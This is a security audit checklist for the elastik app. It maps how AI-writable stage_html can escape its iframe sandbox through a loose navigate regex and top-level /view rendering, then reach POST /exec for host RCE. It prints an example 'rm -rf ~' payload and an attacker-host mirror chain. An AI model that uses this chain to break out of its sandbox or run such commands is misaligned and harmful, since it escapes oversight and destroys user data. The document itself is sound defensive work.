# Root Permission Audit — P0

Status: **open**
Severity: **P0 (path to RCE exists)**
Branch: `sec-fix`

## TL;DR

Any AI-writable `stage_html` can currently chain to `POST /exec`, which runs
`bash -c` / `powershell -Command` on the host. This is unauthenticated RCE from
the model's perspective — the model writes a string, the string runs on the
box.

The audit task: enumerate every surface that executes code or renders HTML at
the **top-level elastik origin**, decide which are legitimate, and close the
rest. "Root" below means top-level origin, not OS root (though this audit
exists because the two collapse into each other at `/exec`).

## What "root" means here

The iframe in `index.html` runs sandboxed (`allow-scripts allow-popups`, no
`allow-same-origin`). It has a null origin. Scripts in stage_html, rendered
inside this iframe, **cannot** touch cookies, localStorage, cached Basic Auth,
or fetch other worlds with credentials.

Anything that executes outside that iframe — at the elastik top-level origin —
is **root**. Root can:

- `fetch('/stages')` and enumerate every world
- `fetch('/<any-world>/read')` and exfiltrate any world
- `fetch('/<any-world>/write', {method:'POST', body})` and overwrite any world
- `fetch('/exec', {method:'POST', body})` and **run arbitrary shell**
- Read cookies / localStorage / Basic Auth cache
- Register/update the Service Worker (origin-wide persistence)

The model writes sandboxed stage_html. The human trusts that sandbox. Any path
that takes the sandboxed content and replays it at root breaks the trust.

## Known root surfaces

Inventory of code paths that return `ct="text/html"` at top-level origin, or
otherwise run at root:

| # | Surface | Source of content | Trust | Status |
|---|---|---|---|---|
| 1 | `GET /<world>` → `INDEX` | `index.html` (tracked file) | human | ✓ trusted |
| 2 | `GET /shell` → `SHELL` | `shell.html` (tracked file) | human | ✓ trusted |
| 3 | `GET /mirror` → `MIRROR` | tracked file | human | ✓ trusted |
| 4 | `GET /m/<domain>/...` proxy | **remote HTTP**, CSP stripped | **attacker** | 🔴 known-bad |
| 5 | `GET /view/<world>` | `stage_html` from SQLite | **AI-writable** | 🔴 P0 |
| 6 | Plugin handlers returning `_html` | plugin code + params | depends | 🟡 audit |
| 7 | `GET /dav/` collection list | world names only | `_VALID_NAME` | ✓ safe |
| 8 | `GET /dav/<world>.html` | stage_html as `text/plain` | AI-writable | ✓ not executed (text/plain) |
| 9 | `GET /sw.js` → `SW` | `sw.js` (tracked file) | human | 🟡 audit scope |
| 10 | `GET /opensearch.xml` | host header interpolated | bounded | 🟡 audit |
| 11 | `POST /exec` (not HTML but terminal sink) | request body | Basic Auth only | 🔴 RCE sink |

## The RCE chain (must be closed)

```
AI writes stage_html in its own world W
    containing <script>...navigate to /view/W...</script>
        │
        ▼
iframe runs script → parent.postMessage(navigate, /view/W)
    index.html:25  regex /^\/[a-zA-Z0-9_-]/  passes
        │
        ▼
window.location = /view/W
    browser fetches /view/W with cached Basic Auth
        │
        ▼
server.py:393  return send_r(..., html, ct="text/html")
    stage_html of W rendered at top-level origin
        │
        ▼
<script> in stage_html runs at ROOT
    fetch('/exec', {method:'POST', body:'rm -rf ~'})
        browser sends cached Basic Auth
            │
            ▼
server.py:372  subprocess.run(['bash','-c', body])
    arbitrary code execution on host
```

Alternate entry (pre-existing, same exit):

```
AI → navigate to /mirror?url=http://evil/x.html
  → server curls attacker, strips CSP, renders at elastik origin
  → attacker JS runs at root → fetch /exec → RCE
```

Both chains share the same exit. Closing `/exec` access from root closes both.

## Audit checklist

### Must close (P0)

- [ ] **Navigate allowlist in `index.html:25`**
      Only accept `/<world-name>` matching `_VALID_NAME`. Reject `/view/*`,
      `/mirror*`, `/shell*`, `/dav*`, anything with `?`, `.`, `/` after the
      world name.
- [ ] **Remove `window.location` pattern-match in iframe helper (`index.html:12`)**
      The eval pre-scan that forwards `window.location=` as a navigate
      postMessage is a sandbox escape primitive. Delete it. If a world needs to
      ask the parent to switch worlds, it calls `parent.postMessage({action:
      'navigate', ...})` explicitly.
- [ ] **CSP on `/view/<world>` responses**
      `Content-Security-Policy: default-src 'none'; script-src 'none'; style-src 'unsafe-inline'`
      /view renders static markup only. No script. No fetch. If a world wants
      interactivity, it gets the iframe on `/<world>`, not `/view/<world>`.
- [ ] **`/exec` must not trust browser-cached Basic Auth alone**
      Either: (a) require a separate header/body token unreachable via CSRF,
      or (b) require `Origin: null` or no `Origin` header (block in-browser
      callers), or (c) require double-submit CSRF token. Cached Basic Auth
      alone is not sufficient for a shell endpoint.

### Should investigate (P1)

- [ ] **Audit `/mirror` / `/m/<domain>` reachability from iframe**
      After the navigate allowlist lands, confirm no path from stage_html can
      reach /mirror. Consider further: gate /mirror behind a confirm click in
      shell, or per-session enable flag.
- [ ] **Audit `/shell` reachability from iframe**
      Same as above. /shell has `el.exec()` one function call away; even
      without an `<script>` in /view, if navigate can reach /shell, top-level
      has power tools.
- [ ] **Service Worker scope**
      What does `sw.js` cache/intercept? Can it be used to pin malicious
      content across reloads? Confirm SW is origin-wide (default) and what
      that means after a poisoned /view render.
- [ ] **Plugin `_html` returns**
      Enumerate all plugins that return `_html`. For each, confirm no user/AI
      input reaches the HTML unescaped. Especially config and auth plugins.
- [ ] **`<!--use:renderer-->` chain**
      Outer world loads inner world's stage via a renderer. Both run in the
      iframe, so sandbox holds. But confirm the renderer world's stage_html
      cannot be substituted for a non-renderer when chained through /view.
- [ ] **`/dav` PUT path normalization**
      Confirm `_dav_world_name` strips no `..`, `\`, etc. `_VALID_NAME` should
      catch this but add an explicit negative test.
- [ ] **OpenSearch host header injection**
      server.py:416 reflects the `Host` header into XML. Confirm XML-escaped
      or bounded to a whitelist of trusted hosts.

### Nice to have (P2)

- [ ] **WebDAV root listing warning banner**
      `/dav/` HTML list should include a visible "AI-generated content, treat
      all links as hostile" banner so users opening in VSCode/Finder know what
      they're looking at.
- [ ] **Kill `/mirror` CSP stripping, or document why it must stay**
      The line `re.sub(..., b'', body)` in `_mirror_proxy` is a deliberate
      sandbox-hole for a use case that should be spelled out in a design doc.
      If there's no clear reason, delete it.
- [ ] **Log all top-level renders**
      Each `/view`, `/shell`, `/mirror` access logged with source IP and
      `Referer`. Not a control but an evidence trail.

## Acceptance criteria

The audit is closed when **all of the following** are true:

1. No sequence of operations available to AI (writing stage_html, writing
   pending_js, calling any `window.__elastik` method) results in a
   browser-side call to `POST /exec`.
2. The regex in `index.html:25` accepts only world names, verified by a red
   team test that enumerates hostile navigate targets.
3. `GET /view/<world>` responses carry a CSP that blocks script execution,
   verified by an automated browser test (headless Chrome) that attempts to
   run a script and fails.
4. `POST /exec` rejects requests from browser origins, verified by a test
   that attempts the RCE chain end-to-end and fails at the final step.
5. No plugin returning `_html` interpolates unescaped input from stage_html,
   request body, or query string.

## Non-goals

- Making stage_html unable to contain `<script>` — sandboxed scripts are a
  feature, not a bug. The sandbox is the wall. The wall stays.
- Blocking `fetch` from the iframe — the iframe is null-origin, its fetches
  are already uncredentialed cross-origin. Nothing to do there.
- Protecting against a user who pastes malicious stage_html themselves — the
  user is trusted; the AI is not.

## Related

- Attack surface writeup (this session, above in chat): navigate vulnerability
  and WebDAV/VSCode considerations.
- `docs/p2p-security.md` — network-level auth, orthogonal.
- `docs/lockdown.md` — IP whitelist, orthogonal.

## Owner

Unassigned. Pick up with `git checkout sec-fix`.
